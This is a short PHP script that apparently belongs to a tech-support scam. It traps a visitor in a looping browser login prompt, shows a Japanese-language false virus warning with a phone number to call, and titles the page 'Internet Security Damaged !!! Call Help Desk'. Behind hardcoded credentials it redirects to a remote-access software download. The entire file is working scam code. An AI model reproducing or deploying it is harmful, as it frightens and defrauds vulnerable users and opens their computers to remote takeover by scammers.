<?php

    session_start();

    $_user = 'windows2016ddsd';
    $_password = 'microsoft1ew';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: sadasdsawqe23231232l.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="コンピュータにインストールされている有害なウイルスが原因で、IPアドレスに不審な活動が検出されました。任意の援助のために今すぐ (050) 5532-7519 にフリーダイヤルに電話してください。 "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: sadasdsawqe23231232l.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
